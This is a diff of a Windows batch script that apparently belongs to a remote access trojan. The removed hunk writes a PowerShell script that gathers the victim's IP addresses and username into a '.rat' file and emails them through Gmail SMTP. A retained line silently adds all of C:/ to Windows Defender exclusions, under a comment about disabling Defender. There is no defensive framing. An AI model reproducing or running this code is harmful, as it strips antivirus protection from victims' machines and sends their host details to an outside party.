@@ -29,23 +29,7 @@ if '%errorlevel%' NEQ '0' (
     pushd "%CD%"
     CD /D "%~dp0"
 
-@REM setup smtp
-(
-    echo $uname = "example@gmail.com" 
-    echo $pword =  "pword"
 
-    echo $ipEthernet = (Get-NetIPAddress -AddressFamily IPv4 -PrefixOrigin Dhcp -AddressState Preferred -InterfaceAlias *Ethernet*).IPAddress
-    echo $ipWlan = (Get-NetIPAddress -AddressFamily IPv4 -PrefixOrigin Dhcp -AddressState Preferred -InterfaceAlias WLAN).IPAddress
-
-    echo echo "Ethernet: $ipEthernet WLan: $ipWlan" > $env:UserName.rat
-
-    echo # email process
-    echo $subject = "$env:UserName logs"
-    echo $smtp = New-Object System.Net.Mail.SmtpClient("smtp.gmail.com", "587");
-    echo $smtp.EnableSSL = $true
-    echo $smtp.Credentials = New-Object System.Net.NetworkCredential($email, $password);
-    echo $smtp.Send($email, $email, $subject, $ip);
-) > smtp.txt
 
 REM ready up to diable defender
 powershell powershell.exe -windowstyle hidden -c "Add-MpPreference -ExclusionPath 'C:/' -Force -ea 0 | Out-Null";
